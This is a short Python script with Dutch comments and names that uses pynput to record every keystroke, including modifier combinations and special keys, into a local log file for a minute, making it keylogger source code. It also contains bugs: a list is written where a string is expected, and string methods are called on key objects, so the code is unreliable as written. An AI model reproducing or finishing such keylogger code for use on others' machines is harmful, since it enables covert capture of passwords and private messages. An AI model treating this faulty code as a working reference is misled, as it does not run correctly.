import time
from pynput import keyboard

SPECIALE_KEYS = {
    "Key.space": " ",
    "Key.enter": "[ENTER]\n",
    "Key.backspace": "[BACKSPACE]",
    "Key.shift": "[SHIFT]",
    "Key.ctrl": "[CTRL]",
    "Key.alt": "[ALT]",
    "Key.tab": "[TAB]",
    "Key.esc": "[ESC]"
}

MOD_KEYS = [
    "Key.shift",
    "Key.ctrl",
    "Key.alt"
]

mods = set()
buffer = []
BUF_GROOTTE = 20
FLUSH_TIJD = 5
MAX_TIJD = 60
start = time.time()


def save(log_file_name: str = "log.txt") -> str:
    """ Schrijft de buffer naar een logfile """
    try:
        if buffer:
            with open(log_file_name, "a") as file:
                file.write(buffer)
            buffer.clear()
            return f"bestand opgeslagen als: {log_file_name}"
    except Exception as e:
        return f"Er ging iets mis: {e}"


def on_keypress(toets):
    print(type(toets))
    try:
        key = toets.replace("'", "")
        if key in MOD_KEYS:
            mods.add(key)
        else:
            log_input(toets)
    except Exception as e:
        print(f"error: {e}")


def on_release(toets):
    try:
        mods.discard(str(toets).replace("'", ""))
        if MAX_TIJD and (time.time() - start) > MAX_TIJD:
            save()
            return False
    except Exception as e:
        print(f"error: {e}")


def log_input(toets: str):
    try:
        t = SPECIALE_KEYS.get(toets.replace(
            "'", ""), toets.replace("'", ""))
        if mods:
            t = "+".join(sorted(mods)) + f"+{t}"
        buffer.append(t)
        if len(buffer) >= BUF_GROOTTE:
            save()
    except Exception as e:
        print(f"er ging iets mis: {e}")


def start_listener():
    with keyboard.Listener(on_press=on_keypress, on_release=on_release):
        try:
            while time.time() - start < MAX_TIJD:
                time.sleep(FLUSH_TIJD)
                save()

        except KeyboardInterrupt:
            save()

        except Exception as e:
            print(f'error: {e}')


if __name__ == "__main__":
    start_listener()
